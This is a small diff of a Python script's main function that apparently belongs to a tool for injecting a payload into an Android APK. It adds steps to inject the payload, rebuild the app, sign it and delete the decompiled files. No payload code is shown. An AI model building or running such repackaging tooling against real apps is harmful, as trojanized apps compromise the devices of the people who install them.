@@ -85,6 +85,8 @@ def main():
     payload = Payload(args.host, args.public_host)
 
     apk = Apk(args.apk)
-    apk.decompile()
-    main_activity, main_activity_file = apk.get_main_activity()
-    logging.info(f"The main activity is: '{main_activity}'")
+    payload.inject(apk)
+    payload.delete()
+    apk.build()
+    apk.sign()
+    apk.remove_decompiled()
